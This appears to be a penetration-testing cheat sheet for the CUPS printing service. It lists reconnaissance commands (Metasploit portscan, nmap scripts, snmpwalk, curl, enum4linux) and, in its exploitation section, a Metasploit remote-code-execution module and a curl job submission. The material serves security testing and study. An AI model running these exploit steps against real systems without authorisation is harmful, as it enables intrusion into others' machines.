# CUPS

## Enumeration

### Metasploit

##### cups_enum
```bash
use auxiliary/scanner/portscan/tcp
set RHOSTS [IP]
set RPORT 631
run
```

### Nmap

##### nmap (CUPS version detection)
```bash
nmap -p 631 --script=cups-info [IP]
```

##### nmap (CUPS banner grab)
```bash
nmap -p 631 --script=http-banner [IP]
```

### snmpwalk

##### snmpwalk (Enumerate CUPS printer info)
```bash
snmpwalk -v 2c -c [community] [IP] 1.3.6.1.2.1.43.5
```

### cURL

##### cURL (Check for open CUPS admin interface)
```bash
curl http://[IP]:631/admin
```

##### cURL (Check CUPS status)
```bash
curl http://[IP]:631/printers
```

### enum4linux

##### enum4linux (Check CUPS service)
```bash
enum4linux -P [IP]
```


---
---


## Exploitation

### Metasploit

##### cups_rce
```bash
use exploit/unix/http/cups_rce
set RHOSTS [IP]
set RPORT 631
run
```

### cURL

##### cURL (Submit a job to the printer)
```bash
curl -X POST -F "file=@[file]" http://[IP]:631/printers/[printername]
```